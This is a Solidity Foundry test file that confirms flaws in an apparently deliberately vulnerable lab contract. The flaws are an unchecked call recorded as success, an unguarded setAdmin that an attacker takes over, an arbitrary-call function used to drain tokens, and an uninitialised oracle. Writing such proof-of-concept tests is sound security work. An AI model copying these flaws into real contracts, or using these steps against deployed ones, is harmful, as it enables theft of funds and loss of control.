// SPDX-License-Identifier: MIT
pragma solidity 0.8.37;

import {Test} from "forge-std/Test.sol";
import {StaticLab} from "../src/noisy/StaticLab.sol";
import {LabToken, RevertingAction} from "../src/mocks/StaticMocks.sol";

contract NoisyFindingsTest is Test {
    StaticLab internal lab;
    address internal admin;
    address internal attacker;

    function setUp() public {
        admin = makeAddr("admin");
        attacker = makeAddr("attacker");
        lab = new StaticLab(admin);
    }

    function test_Confirmed_UncheckedCallCreatesFalseSuccess() public {
        RevertingAction target = new RevertingAction();
        bytes memory data = abi.encodeCall(target.run, (bytes("fails")));

        lab.unsafeExecute(address(target), data);

        assertTrue(lab.completed(), "failure was recorded as success");
    }

    function test_Confirmed_AnyoneCanTakeAdminRole() public {
        vm.prank(attacker);
        lab.setAdmin(attacker);

        assertEq(lab.admin(), attacker);
    }

    function test_Confirmed_ArbitraryCallCanMoveAssetsHeldByLab() public {
        LabToken token = new LabToken();
        token.mint(address(lab), 100 ether);
        bytes memory data = abi.encodeCall(token.transfer, (attacker, 100 ether));

        vm.prank(attacker);
        lab.arbitraryExecute(address(token), data);

        assertEq(token.balanceOf(address(lab)), 0);
        assertEq(token.balanceOf(attacker), 100 ether);
    }

    function test_Confirmed_UninitializedOracleMakesReadPathUnusable() public {
        (bool success,) = address(lab).call(abi.encodeCall(StaticLab.readOracle, ()));

        assertFalse(success);
        assertEq(lab.oracle(), address(0));
    }
}
